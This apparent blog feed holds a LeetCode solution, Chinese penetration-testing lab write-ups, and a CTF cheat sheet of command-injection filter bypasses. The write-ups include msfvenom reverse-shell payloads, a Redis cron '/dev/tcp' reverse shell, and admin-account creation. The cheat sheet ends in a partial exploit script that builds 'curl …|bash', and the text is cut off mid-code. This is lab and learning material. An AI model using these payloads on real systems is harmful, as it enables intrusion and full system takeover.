 &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">diameterOfBinaryTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root.right == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> helper(root.left);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (root.left == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> helper(root.right);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> leftLength = helper(root.left);</span><br><span class="line">            <span class="keyword">int</span> rightLength = helper(root.right);</span><br><span class="line">            <span class="keyword">return</span> leftLength + rightLength;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">helper</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> Math.max(helper(root.left), helper(root.right)) + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是leetcode提交的时候给了一个奇葩的测试样例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[4,-7,-3,null,null,-9,-3,9,-7,-4,null,6,null,-6,-6,null,null,0,6,5,null,9,null,null,-1,-4,null,null,null,-2]</span><br></pre></td></tr></table></figure><p>这。。</p><p><img src= "/img/loading.gif" data-src="/posts/c2fa82b5/1583846422840.png" alt></p><p>算了我暂时也看不出哪里有问题</p><h2 id="官方"><a href="#官方" class="headerlink" title="官方"></a>官方</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">diameterOfBinaryTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        ans = <span class="number">1</span>;</span><br><span class="line">        depth(root);</span><br><span class="line">        <span class="keyword">return</span> ans - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">depth</span><span class="params">(TreeNode node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 访问到空节点了，返回0</span></span><br><span class="line">        <span class="keyword">int</span> L = depth(node.left); <span class="comment">// 左儿子为根的子树的深度</span></span><br><span class="line">        <span class="keyword">int</span> R = depth(node.right); <span class="comment">// 右儿子为根的子树的深度</span></span><br><span class="line">        ans = Math.max(ans, L+R+<span class="number">1</span>); <span class="comment">// 计算d_node即L+R+1 并更新ans</span></span><br><span class="line">        <span class="keyword">return</span> Math.max(L, R) + <span class="number">1</span>; <span class="comment">// 返回该节点为根的子树的深度</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路也是比较简单的，不过这个用法很神奇，<code>depth</code> 函数有返回值，这个返回值只在递归的时候用到</p><p>java写OJ的时候如果要用全局变量，只需要在外面写一个就行了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://leetcode-cn.com/problems/diameter-of-binary-tree/solution/liang-chong-si-lu-shi-yong-quan-ju-bian-liang-yu-b/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/diameter-of-binary-tree/solution/liang-chong-si-lu-shi-yong-quan-ju-bian-liang-yu-b/</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞挖掘实验</title>
      <link href="/posts/12fff649/"/>
      <url>/posts/12fff649/</url>
      
        <content type="html"><![CDATA[<p>实验拓扑如下</p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583830717716.png" alt></p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583830733667.png" alt></p><h2 id="任务一-寻找漏洞主机"><a href="#任务一-寻找漏洞主机" class="headerlink" title="任务一 寻找漏洞主机"></a>任务一 寻找漏洞主机</h2><p>扫描存活主机(虽然知道了但还是扫一下)</p><p>注意本机ip是192.168.1.2</p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583830890209.png" alt></p><p>-F 选项快速扫描一下其他主机</p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583830929741.png" alt></p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583830945755.png" alt></p><p>既然是ftp，那么就锁定192.168.1.3</p><p>提示了搜索vsftpd (靶机上搜索太慢了，我在自己机器上搜索的)</p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583831162349.png" alt></p><p>然后使用这个exploit去打就行了</p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583831194224.png" alt></p><p>可以看到进去就是root权限hhhh</p><p>然后还要搜索 1.key 这个文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find  &#x2F; -name 1.key</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583831225885.png" alt></p><p>读一下就好了</p><h2 id="任务二-使用nikto、crunch和burpsuite进行网站渗透和控制"><a href="#任务二-使用nikto、crunch和burpsuite进行网站渗透和控制" class="headerlink" title="任务二 使用nikto、crunch和burpsuite进行网站渗透和控制"></a>任务二 使用nikto、crunch和burpsuite进行网站渗透和控制</h2><p>此时的目标转向了 192.168.1.4 (192.168.1.3都拿到root了)</p><p>打开网站是 Cms made Simple 简称cms cms</p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583831499729.png" alt></p><p>后台地址 <code>/admin/login.php</code></p><p>先设置一个代理</p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583832214527.png" alt></p><p>然后抓个包</p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583832242295.png" alt></p><p>由于密码是 <code>admin</code> 加上三位数字，如果想用 crunch 生成也行，直接用burp也行</p><p>爆破成功</p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583832729565.png" alt></p><p>进入到网站后台</p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583832774511.png" alt></p><h2 id="任务三-获取webshell权限并拿到目标及开放的远程桌面端口号"><a href="#任务三-获取webshell权限并拿到目标及开放的远程桌面端口号" class="headerlink" title="任务三 获取webshell权限并拿到目标及开放的远程桌面端口号"></a>任务三 获取webshell权限并拿到目标及开放的远程桌面端口号</h2><p>漏洞点在这</p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583833127686.png" alt></p><p>Run一下</p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583833240668.png" alt></p><p>好那我们这里为了避免网页卡顿。用msf生成一个shell.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.2 lport&#x3D;4444 -f raw -o shell.txt</span><br></pre></td></tr></table></figure><p>然后复制到框框里运行一下</p><p>同时msf进行监听</p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583833748737.png" alt></p><p>成功弹到shell。之后再使用msf生成shell.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.2 lport&#x3D;4444 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><p>上传，重新弹一个shell</p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583833790609.png" alt></p><p>ok这时候就能获得真正的meterpreter了</p><p>查看一下监听端口</p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583833821793.png" alt></p><p>随便猜一个吧2333</p><h2 id="任务四-向目标主机添加用户并控制"><a href="#任务四-向目标主机添加用户并控制" class="headerlink" title="任务四 向目标主机添加用户并控制"></a>任务四 向目标主机添加用户并控制</h2><p>这个步骤和上一个实验比较相似，就不用细说了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user hacker Beijing123 &#x2F;add</span><br><span class="line">net localgroup administrators hacker &#x2F;add</span><br></pre></td></tr></table></figure><p>远程登陆之后，给文件添加一个用户即可</p><p>最后</p><p><img src= "/img/loading.gif" data-src="/posts/12fff649/1583833940934.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>企业环境渗透2</title>
      <link href="/posts/c08799e1/"/>
      <url>/posts/c08799e1/</url>
      
        <content type="html"><![CDATA[<h2 id="任务一-weblogic反序列化"><a href="#任务一-weblogic反序列化" class="headerlink" title="任务一 weblogic反序列化"></a>任务一 weblogic反序列化</h2><p>浏览器访问192.168.2.10:7001 然后就404</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1583826737126.png" alt></p><p>使用工具包中的webloigc利用工具</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1583826784567.png" alt></p><p>看到flag了是不是，然后执行 <code>cat /home/flag</code> 是吧233333</p><p>其实，这个flag不过就是个目录。。</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1583826861077.png" alt></p><p>得到flag</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1583826902355.png" alt="1583826902355"></p><h2 id="任务二-Wrodpress-任意文件读取"><a href="#任务二-Wrodpress-任意文件读取" class="headerlink" title="任务二 Wrodpress 任意文件读取"></a>任务二 Wrodpress 任意文件读取</h2><p>wpscan常规扫描一下</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1583826949884.png" alt></p><p>存在一个任意文件读取漏洞</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1583826994083.png" alt></p><h2 id="任务三-Wordpress命令执行"><a href="#任务三-Wordpress命令执行" class="headerlink" title="任务三 Wordpress命令执行"></a>任务三 Wordpress命令执行</h2><ol><li>利用 Burpsuite的 repeater模块修改包探测漏洞存在的字段</li><li>执行wordpress mailer 命令执行漏洞的利用脚本尝试获取shell</li></ol><p>执行 <code>wordpress-rce-exploit.sh</code> 获取到flag</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588132036186.png" alt></p><h2 id="任务四-改进漏洞利用脚本获得命令执行权限"><a href="#任务四-改进漏洞利用脚本获得命令执行权限" class="headerlink" title="任务四 改进漏洞利用脚本获得命令执行权限"></a>任务四 改进漏洞利用脚本获得命令执行权限</h2><ol><li>通过分析sendmail中的语法改进作者的漏洞利用脚本，缩短host字段的长度绕过限制</li><li>利用改进后的漏洞利用脚本来获取shell</li></ol><p>修改脚本：</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588132544267.png" alt></p><p>执行脚本</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588132523479.png" alt></p><p>打开另一个shell 进行监听</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588132513711.png" alt></p><p>成功获得反弹的shell</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588132491640.png" alt></p><p>使用 <code>python</code> 开启一个服务器</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588133151756.png" alt></p><p>上传 <code>tunnel.nosocker.php</code></p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588133135867.png" alt></p><p>成功上传</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588133164733.png" alt></p><p>开启代理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -p 8080 -u http:&#x2F;&#x2F;192.168.2.11&#x2F;tunnel.nosocket.php</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588134528946.png" alt></p><p>扫描内网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.1.11</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588134555511.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.1.10</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588134580261.png" alt></p><p>都开放了80端口，并且看出 <code>192.168.1.11</code> 是Windows， <code>192.168.1.10</code> 是Linux</p><h2 id="任务五-redsi未授权访问-ffmpeg任意文件读取"><a href="#任务五-redsi未授权访问-ffmpeg任意文件读取" class="headerlink" title="任务五 redsi未授权访问+ffmpeg任意文件读取"></a>任务五 redsi未授权访问+ffmpeg任意文件读取</h2><ol><li>查看网页信息可知，是通过ffmpeg处理视频的小应用，只有上传，下载和删除功能，此处存在ffmpeg文件读取漏洞，构造特定的avi视频，经过ffmpeg处理之后的视频就会包含想要的文件内容。利用文件读取漏洞获取redis配置文件内容</li><li>redis数据库服务，允许外连且没有设置密码，可以随意访问，此处存在未授权访问漏洞，正常情况下可以写入文件，但是过程中发现，必要的config命令被替换了。而config命令的替换一定是写在redis的配置文件中的，配置文件的路径又可以在redis中执行info获取到，在以上环境中获取到redis服务器的shell</li></ol><p>访问 <code>http://192.168.1.11</code></p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588134685034.png" alt></p><p>连接 <code>redis</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains .&#x2F;redis-cli -h 192.168.1.11</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588134783500.png" alt></p><p>看到配置文件的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;redis&#x2F;63799.conf</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588135266214.png" alt></p><p>下载得到 456.avi</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588135317666.png" alt></p><p>发现 <code>config</code> 命令被替换成了 <code>ccoonnffiigg</code></p><p>redis连接，通过计划任务反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains .&#x2F;redis-cli -h 192.168.2.11</span><br><span class="line"></span><br><span class="line">ccoonnnffiigg set dir &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">set xxx &quot;\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.11&#x2F;9999 0&amp;&gt;1\n\n&quot;</span><br><span class="line">ccoonnnffiigg set dbfilename root</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588143052787.png" alt></p><p>成功反弹shell</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588142962941.png" alt></p><p><code>/home/flag/flag.txt</code></p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588142981379.png" alt></p><p><code>/etc/redis/63799.conf</code> </p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588143001902.png" alt></p><h2 id="任务六-drupal8-远程代码执行"><a href="#任务六-drupal8-远程代码执行" class="headerlink" title="任务六 drupal8 远程代码执行"></a>任务六 drupal8 远程代码执行</h2><ol><li>使用浏览器代理访问内网机器 <code>192.168.1.10</code></li><li>利用drupal8的php反序列化漏洞向目标服务器写入webshell</li><li>使用Cknife连接已经生成的webshell</li></ol><p>设置代理</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588143278974.png" alt></p><p>访问</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588143264527.png" alt></p><p>弱口令 <code>admin,admin</code>登陆后台</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588143532782.png" alt></p><p>访问 <code>http://192.168.1.10/admin/config/development/configurations/single/import</code></p><p>导入 <code>drupal_exp.txt</code> 中的内容</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588143822617.png" alt></p><p>网站根目录生成 <code>shell.php</code></p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588143892842.png" alt></p><p><code>Cknife</code> 连接，设置代理地址</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588143796161.png" alt></p><p>第一个flag</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588143925249.png" alt></p><p>第二个flag</p><p><img src= "/img/loading.gif" data-src="/posts/c08799e1/1588143937477.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行绕过技巧</title>
      <link href="/posts/58281de6/"/>
      <url>/posts/58281de6/</url>
      
        <content type="html"><![CDATA[<h2 id="tar命令绕过"><a href="#tar命令绕过" class="headerlink" title="tar命令绕过"></a>tar命令绕过</h2><p>最近也是才知道的姿势，很多CTF题目并没有过滤tar命令，可以直接打包然后下载，GXYCTF的一道题就可以这样非预期</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;1;tar$IFS$9-cvf$IFS$9index$IFS$9.</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/58281de6/1582542493140.png" alt></p><h2 id="Windows命令执行"><a href="#Windows命令执行" class="headerlink" title="Windows命令执行"></a>Windows命令执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"../ %1a whoami"</span>;</span><br><span class="line">$command = <span class="string">'dir '</span>.urldecode($a);</span><br><span class="line">$escaped_command = escapeshellcmd($command);</span><br><span class="line">var_dump($escaped_command);</span><br><span class="line">file_put_contents(<span class="string">'out.bat'</span>,$escaped_command);</span><br><span class="line">system(<span class="string">'out.bat'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src= "/img/loading.gif" data-src="/posts/58281de6/2020/PersonNote/CTF笔记/命令执行绕过技巧/1581933022683.png" style="zoom:50%;"><h2 id="命令分隔符"><a href="#命令分隔符" class="headerlink" title="命令分隔符"></a>命令分隔符</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|</span><br><span class="line">||</span><br><span class="line">&amp;&amp;</span><br><span class="line">;</span><br></pre></td></tr></table></figure><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~ ᐅ cat&lt;&gt;flag     </span><br><span class="line">flag&#123;fffffffffff&#125;</span><br><span class="line">~ ᐅ cat&lt;flag </span><br><span class="line">flag&#123;fffffffffff&#125;</span><br></pre></td></tr></table></figure><p><code>${IFS}</code> </p><p>这算是Linux中的一个变量</p><blockquote><p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符（internal field separator）。IFS环境变量定义了bash shell用户字段分隔符的一系列字符。默认情况下，bash shell会将下面的字符当做字段分隔符：空格、制表符、换行符。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~ ᐅ echo $&#123;IFS&#125; &gt; aa.txt</span><br><span class="line">~ ᐅ xxd aa.txt </span><br><span class="line">00000000: 2009 0a00 0a                              ....</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;用python读取一下</span><br><span class="line">&gt;&gt;&gt; f &#x3D; open(&quot;aa.txt&quot;)</span><br><span class="line">&gt;&gt;&gt; f.readlines()</span><br><span class="line">[&#39; \t\n&#39;, &#39;\x00\n&#39;]</span><br></pre></td></tr></table></figure><p>使用 <code>${IFS}</code> 绕过(但是我没有实验成功)  ==只适用于Ubuntu==</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-207-93-ubuntu:~$ cat flag</span><br><span class="line">nice day</span><br><span class="line">ubuntu@VM-207-93-ubuntu:~$ cat<span class="variable">$&#123;IFS&#125;</span>flag</span><br><span class="line">nice day</span><br><span class="line"></span><br><span class="line">ubuntu@VM-207-93-ubuntu:~$ cat<span class="variable">$&#123;IFS&#125;</span><span class="variable">$9flag</span></span><br><span class="line">nice day</span><br><span class="line">ubuntu@VM-207-93-ubuntu:~$ cat<span class="variable">$IFS</span><span class="variable">$9flag</span></span><br><span class="line">nice day</span><br></pre></td></tr></table></figure><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p>有些时候会设置一些关键字过滤(比如设置flag)</p><h3 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ ᐅ a&#x3D;c;b&#x3D;at;c&#x3D;flag;$a$b $c</span><br><span class="line">flag&#123;fffffffffff&#125;</span><br></pre></td></tr></table></figure><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ ᐅ echo &quot;Y2F0IGZsYWc&#x3D;&quot;|base64 -d|bash</span><br><span class="line">flag&#123;fffffffffff&#125;</span><br></pre></td></tr></table></figure><h3 id="单引号双引号"><a href="#单引号双引号" class="headerlink" title="单引号双引号"></a>单引号双引号</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~ ᐅ c<span class="string">""</span>at flag</span><br><span class="line">flag&#123;fffffffffff&#125;</span><br><span class="line">~ ᐅ c<span class="string">""</span>at fl<span class="string">""</span>ag</span><br><span class="line">flag&#123;fffffffffff&#125;</span><br><span class="line">~ ᐅ c<span class="string">""</span>at fl<span class="string">''</span>ag</span><br><span class="line">flag&#123;fffffffffff&#125;</span><br></pre></td></tr></table></figure><h3 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~ ᐅ c\at fl\ag</span><br><span class="line">flag&#123;fffffffffff&#125;</span><br></pre></td></tr></table></figure><h2 id="绕过长度的限制"><a href="#绕过长度的限制" class="headerlink" title="绕过长度的限制"></a>绕过长度的限制</h2><p>原题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>Linux 可以通过 <code>\</code> 换行</p><p><code>sh filename</code> 可以执行一个shell脚本，如果有报错的话会自动跳过</p><p><code>&gt;</code> 会覆盖原有的内容</p><p><code>&gt;&gt;</code> 是追加内容</p><p>思路就是通过构造一个文件然后往里面写入类似<code>curl 192.168.1.104|bash</code> 之类的语句然后执行，其实还可以利用其他python 以及PHP环境去执行代码，访问 <code>192.168.1.104/index.php</code>里面的内容<code>bash -i &gt;&amp; /dev/tcp/192.168.1.104/12345 0&gt;&amp;1</code>从而达到反弹webshell的目的</p><p>php执行生成的_的内容序列并非和我们在linux命令行一样，查资料 ls 排序和应该和环境变量<code>LC_COLLATE</code>有关！而php应该是c<br><a href="https://www.zhihu.com/question/273928679" target="_blank" rel="noopener">https://www.zhihu.com/question/273928679</a></p><p><img src= "/img/loading.gif" data-src="/posts/58281de6/1582539212357.png" alt></p><p>最后的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">'&gt;ls\\'</span>, </span><br><span class="line">    <span class="string">'ls&gt;_'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;-t\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line">    <span class="string">'ls&gt;&gt;_'</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw|python`</span></span><br><span class="line">    <span class="comment"># generate `curl 10.188.2.20|bash` </span></span><br><span class="line">    <span class="string">'&gt;sh\ '</span>, </span><br><span class="line">    <span class="string">'&gt;ba\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="string">'&gt;20\\'</span>,</span><br><span class="line">    <span class="string">'&gt;2.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;8.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;18\\'</span>, </span><br><span class="line">    <span class="string">'&gt;0.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;1\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, 